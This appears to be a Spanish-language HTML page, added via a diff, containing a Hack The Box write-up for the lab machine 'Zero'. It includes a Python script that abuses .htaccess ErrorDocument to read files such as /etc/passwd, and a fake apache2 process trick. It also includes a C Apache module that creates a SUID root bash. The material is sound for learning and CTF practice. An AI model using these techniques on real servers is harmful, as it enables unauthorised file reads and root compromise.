@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>HTB: Zero</title>
+  <meta name="description" content="Zero es una máquina de Hack The Box centrada en el abuso de Apache y la explotación de configuraciones avanzadas. Aquí te muestro el proceso completo, desde el reconocimiento hasta la obtención de root.">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="/assets/images/hackthebox.webp">
+  <link rel="stylesheet" href="/assets/css/main.css">
+</head>
+<body>
+  <div class="container">
+    <div align="center">
+      <img src="/img/zero-cover.png" alt="Zero" style="height:150px;">
+    </div>
+
+    <h1>HTB: Zero</h1>
+    <p>Zero es una máquina de Hack The Box donde el reto principal es abusar de la configuración de Apache en un entorno de hosting compartido. El objetivo es obtener acceso root explotando la gestión de procesos y la configuración personalizada del servidor web.</p>
+
+    <h2>Box Info</h2>
+    <table>
+      <tr>
+        <th>Name</th>
+        <td><a href="https://hackthebox.com/machines/zero">Zero</a> <img src="/icons/box-zero.png" alt="Zero"></td>
+      </tr>
+      <tr>
+        <th>Release Date</th>
+        <td>12 Aug 2025</td>
+      </tr>
+      <tr>
+        <th>Retire Date</th>
+        <td>12 Aug 2025</td>
+      </tr>
+      <tr>
+        <th>OS</th>
+        <td>Linux <img src="/icons/Linux.png" alt="Linux"></td>
+      </tr>
+      <tr>
+        <th>Base Points</th>
+        <td>Insane [50]</td>
+      </tr>
+      <tr>
+        <th>Creator</th>
+        <td><a href="https://app.hackthebox.com/users/77141">jkr</a></td>
+      </tr>
+    </table>
+
+    <h2>Recon</h2>
+    <h3>Escaneo Inicial</h3>
+    <pre><code>nmap -p- -vvv --min-rate 10000 10.129.234.62
+nmap -p 22,80 -sCV 10.129.234.62
+</code></pre>
+    <p>Puertos abiertos: <strong>22/SSH</strong> y <strong>80/HTTP</strong>. El servidor corre Apache 2.4.41 sobre Ubuntu 20.04.</p>
+
+    <h3>Sitio Web</h3>
+    <p>El sitio es un proveedor de hosting que permite subir archivos vía SFTP y solo sirve páginas HTML estáticas.</p>
+
+    <h4>SFTP</h4>
+    <p>Se obtiene acceso SFTP con las credenciales generadas en el registro. Dentro del directorio <code>public_html</code> se encuentra un archivo <code>.htaccess</code> controlado por root y un <code>index.html</code>.</p>
+
+    <h4>Prueba de ejecución PHP</h4>
+    <p>Al subir archivos <code>.php</code>, el servidor solo muestra el código fuente, no lo ejecuta.</p>
+
+    <h4>Abuso de .htaccess para File Read</h4>
+    <p>Se puede modificar <code>.htaccess</code> para leer archivos arbitrarios usando la directiva <code>ErrorDocument</code>:</p>
+    <pre><code>Header always set X-Zero-Customer 'zro-de834d1c'
+ErrorDocument 404 %{file:/etc/passwd}
+</code></pre>
+    <p>Al solicitar un archivo inexistente, el contenido de <code>/etc/passwd</code> se muestra en la respuesta.</p>
+
+    <h4>Script para automatizar File Read</h4>
+    <pre><code>import sys
+import paramiko
+import requests
+
+if len(sys.argv) != 5:
+    print(f"usage: {sys.argv[0]} &lt;host&gt; &lt;username&gt; &lt;password&gt; &lt;file_to_read&gt;")
+    sys.exit(1)
+
+host, username, password, target_file = sys.argv[1:5]
+
+def write_file(host, username, password, content):
+    ssh_client = paramiko.SSHClient()
+    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    ssh_client.connect(hostname=host, port=22, username=username, password=password)
+    sftp_client = ssh_client.open_sftp()
+    target_path = "public_html/.htaccess"
+    sftp_client.remove(target_path)
+    with sftp_client.file(target_path, "wb") as remote_file:
+        remote_file.write(content)
+
+def read_file(host, username):
+    resp = requests.get(f"http://{host}/~{username}/0xdf.whatever")
+    assert resp.status_code == 404
+    return resp.text
+
+htcontent = f"ErrorDocument 404 %{{file:{target_file}}}".encode()
+write_file(host, username, password, htcontent)
+print(read_file(host, username))
+</code></pre>
+
+    <h2>Escalada de Privilegios</h2>
+    <h3>Enumeración</h3>
+    <p>Al obtener acceso SSH como <code>zroadmin</code> (credenciales extraídas de la base de datos), se observa que existen scripts ejecutados por root cada minuto, incluyendo <code>/usr/local/bin/zro.web-confcheck</code>.</p>
+
+    <h3>Abuso de procesos y apache2ctl</h3>
+    <p>Se puede crear un proceso falso que simule ser Apache con argumentos controlados, y así manipular la ejecución de <code>apache2ctl</code> para incluir archivos arbitrarios o cargar módulos maliciosos.</p>
+
+    <h4>Ejemplo de proceso falso en Python</h4>
+    <pre><code>import os
+os.execv('/bin/sleep', ['/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -d /dev/shm/fileread -E /dev/shm/fileread.log -c', "223"])
+</code></pre>
+
+    <h4>Ejemplo de módulo malicioso en C</h4>
+    <pre><code>#include "httpd.h"
+#include "http_config.h"
+#include "http_protocol.h"
+#include "ap_config.h"
+
+static void myinit(apr_pool_t *p, server_rec *s) {
+    system("cp /bin/bash /tmp/0xdf; chown root:root /tmp/0xdf; chmod 6777 /tmp/0xdf");
+}
+
+module AP_MODULE_DECLARE_DATA mymodule = {
+    STANDARD20_MODULE_STUFF,
+    NULL, NULL, NULL, NULL, NULL, NULL
+};
+
+__attribute__((constructor))
+static void _init() { myinit(NULL, NULL); }
+</code></pre>
+    <p>Compilar y cargar este módulo permite obtener una shell root vía bash SUID.</p>
+
+    <h2>Conclusión</h2>
+    <p>Zero es una máquina avanzada que explota la gestión de procesos y la configuración de Apache para lograr la escalada de privilegios. El reto principal es la creatividad para abusar de <code>.htaccess</code>, procesos y módulos personalizados.</p>
+
+    <hr>
+    <p><strong>¿Te gustó el writeup?</strong><br>
+    Puedes ver la resolución completa en mi canal de YouTube:<br>
+    <a href="https://www.youtube.com/watch?v=wOm4OOBLbys">Máquina Zero - HackTheBox</a>
+    </p>
+  </div>
+</body>
+</html>
